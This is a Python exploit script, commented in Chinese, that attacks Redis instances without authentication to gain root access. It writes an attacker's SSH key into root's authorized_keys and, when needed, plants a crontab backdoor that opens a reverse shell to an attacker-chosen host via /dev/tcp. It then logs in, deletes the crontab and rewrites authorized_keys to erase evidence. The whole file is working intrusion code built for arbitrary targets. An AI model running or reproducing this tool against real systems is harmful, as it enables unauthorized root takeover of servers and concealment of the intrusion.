#coding:utf-8

###############################################
#Author       JoyChou                        ##
#Date         2015-11-16                     ##
#Discription  Redis未授权访问写入ssh公钥exp    ##
###############################################

#如果没有/root/.ssh/目录，该脚本不支持ubuntu系统
#update1:2016年4月12日
#新增反弹shell功能（ssh+shell或者ssh）



import sys
import redis   # pip install redis
import socket
import time
import paramiko # check ssh login
import argparse

#超时socket连接超时的时间为1s
socket.setdefaulttimeout(2)
#判断是否成功生成了crontab backdoor
make_cron_success = False


#通过telnet验证是否有未授权漏洞
#当使用iptables验证的时候，connect连接会超时
def is_vul_by_telnet(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    res = False

    try:
        s.connect((host, port))
        #通过info判断是否有redis未授权访问
        redis_cmd = "info" + "\n"
        #send的内容必须加\n
        s.send(redis_cmd)
        if "redis_version" in s.recv(1024):
            s.send("quit\n")
            res = True
    except Exception, e:
        res = False

    s.close()
    return res

#验证是否可以成功登录ssh
#成功登陆后，写入不含redis的 authorized_keys
def check_ssh_login(host):
    global ssh_private_keyfile
    global ssh_port
    global ssh_public_keyfile


    try:
        key = paramiko.RSAKey.from_private_key_file(ssh_private_keyfile)
        ssh = paramiko.SSHClient()
        #通过公共方式进行认证(不需要在known_hosts文件中存在)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=ssh_port, username='root', pkey=key)
        stdin, stdout, stderr = ssh.exec_command('echo "hacked by helen"')
        if "hacked by helen" in stdout.read():
            #如果crontab创建了/root/.ssh/目录，需要删除crontab
            #因为crontab文件已经被破坏，最好删除留下的crontab后门
            stdin, stdout, stderr = ssh.exec_command('strings /var/spool/cron/root | grep REDIS')
            if 'REDIS' in stdout.read():
                ssh.exec_command('rm /var/spool/cron/root')
            #成功登陆后，重新写入不含redis的 authorized_keys,清除掉redis入侵的痕迹
            sftp = ssh.open_sftp()
            sftp.put(ssh_public_keyfile, '/root/.ssh/authorized_keys')
            return True
    except Exception, e:
        return False

#判断是否新建了/root/.ssh/目录
def is_mkdir_ssh_dir(host, port):
    global ssh_public_keyfile
    sshkey_success = False

    try:
        r = redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)
        foo = open(ssh_public_keyfile, 'rb').read()
        #r.flushall()
        r.set('redis_sshkey',foo)
        r.config_set('dir','/root/.ssh/')
        r.config_set('dbfilename','authorized_keys')
        r.save()
        sshkey_success = True
    except Exception, e:
        sshkey_successc = False
    return sshkey_success

#生成创建/root/.ssh目录的crontab后门
def make_crontab(host, port):
    global make_cron_success
    global rebound_shell_ip # rebound shell ip
    global rebound_shell_port # rebound shell port
    try:
        r = redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)
        mkdir_ssh_crontab = '\n\n\n' + '*/1 * * * * mkdir /root/.ssh/\n\n\n'
        mkshell_crontab = '\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1 \n\n\n' % (rebound_shell_ip,rebound_shell_port)
        ssh_shell_crontab = '\n\n\n*/1 * * * * mkdir /root/.ssh/;bash -i >& /dev/tcp/%s/%s 0>&1 \n\n\n' % (rebound_shell_ip, rebound_shell_port)
        #如果要反弹shell，那么创建.ssh目录和反弹shell，否则只创建.ssh目录
        if rebound_shell_ip is not None:
            crontab_backdoor = ssh_shell_crontab
        else:
            crontab_backdoor = mkdir_ssh_crontab

        r.set('redis_crontab',crontab_backdoor)
        r.config_set('dir','/var/spool/cron/')
        r.config_set('dbfilename','root')
        r.save()
        make_cron_success = True
    except Exception, e:
        print e
    return make_cron_success



#利用crontab创建/root/.ssh/目录
def mkdir_ssh_by_crontab(host, port):
    global make_cron_success
    mkdir_ssh_dir_success = False
    tmp = 0
    try:
        if make_cron_success:
            while True:
                time.sleep(5)
                tmp = tmp + 1
                mtime = 5*tmp
                #通过执行时间是否有1分钟，判断是否是Ubuntu系统
                if mtime >= 60:
                    print "\033[1;32;40m[-]\033[0m Shit!What the fuck of ubuntu!"
                    exit()
                print '[+] Making /root/.ssh/ directory. Wait a monment...'
                if is_mkdir_ssh_dir(host, port):
                    mkdir_ssh_dir_success = True
                    break
    except Exception, e:
        print e

    return mkdir_ssh_dir_success


#写入ssh公钥
def write_authorized_keys(host, port):
    global make_cron_success
    global ssh_public_keyfile

    sshkey_success = False

    try:
        r = redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)
        foo = open(ssh_public_keyfile, 'rb').read()
        #r.flushall()
        r.set('redis_sshkey',foo)
        r.config_set('dir','/root/.ssh/')
        r.config_set('dbfilename','authorized_keys')
        r.save()
        sshkey_success = True
    except Exception, e:
        print "\033[1;31;40m[-]\033[0m Something wrong with %s "%host
        print "\033[1;31;40m[-]\033[0m %s "%e

        # if .ssh directory is not exist, write crontab mkdir .ssh dir
        if 'Changing directory: No such file or directory' in e:
            if make_crontab(host, port):
                print "\033[1;34;40m[+]\033[0m Success to make crontab backdoor "
                if mkdir_ssh_by_crontab(host, port):
                    print "\033[1;34;40m[+]\033[0m Make /root/.ssh/ directory success "
                    sshkey_success = True

    if sshkey_success:
        print '\033[1;34;40m[+]\033[0m Write ssh authorized_keys success'
        if check_ssh_login(host):
            print "\033[1;34;40m[+]\033[0m Success to ssh_login !"
            print '\033[1;34;40m[+]\033[0m ssh -i %s -p %d root@%s'%(ssh_private_keyfile, ssh_port, host)
        else:
            print "\033[1;32;40m[-]\033[0m Failed to ssh_login !"
    return sshkey_success

#通过python自带的redis判断是否存在redis未授权
def is_vul_by_redis(host, port):
    try:
        r = redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2)
        # 获取redis数据库的大小，如果获取失败会抛出异常，证明不存在redis未授权漏洞
        size = r.dbsize()
        return True
    except Exception, e:
        return False

def getargs():
    parser = argparse.ArgumentParser(description='''
    For Example:
    -----------------------------------------------------------------------------
    python hackredis.py -t 123.56.11.22 -sp 22 -rsi x.x.x.x -rsp 5555 -pubkey ssh_public_key -prikey ssh_private_key''')
    parser.add_argument('-t', dest='target_ip', type=str, help='target ip')
    parser.add_argument('-sp', dest='ssh_port', type=int, default=22, help='ssh port to login ssh')
    parser.add_argument('-rsi', dest='rebound_shell_ip', type=str, help='rebound shell ip')
    parser.add_argument('-rsp', dest='rebound_shell_port', type=str, default=1234, help='rebound shell port')
    #parser.add_argument('-f', action='store_false', dest='not_rebound_bash_shell', help='do not rebound shell')
    parser.add_argument('-pubkey', dest='ssh_public_keyfile', type=str, help='ssh public key file')
    parser.add_argument('-prikey', dest='ssh_private_keyfile', type=str, help='ssh private key file')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    return parser.parse_args()

def main():

    global ssh_port
    global ssh_public_keyfile
    global ssh_private_keyfile
    global rebound_shell_ip
    global rebound_shell_port

    port = 6379
    args = getargs()
    host = args.target_ip
    ssh_port = args.ssh_port
    ssh_public_keyfile = args.ssh_public_keyfile
    ssh_private_keyfile = args.ssh_private_keyfile
    rebound_shell_ip = args.rebound_shell_ip
    rebound_shell_port = args.rebound_shell_port

    if is_vul_by_redis(host, port):
        print "[*] Attacking ip:%s"%host
        print '\033[1;34;40m[+]\033[0m Redis unauthorized access vulnerablity'
        write_authorized_keys(host, port)
    else:
        print 'Not Vulnerable\nByeBye'

if __name__ == '__main__':
    main()
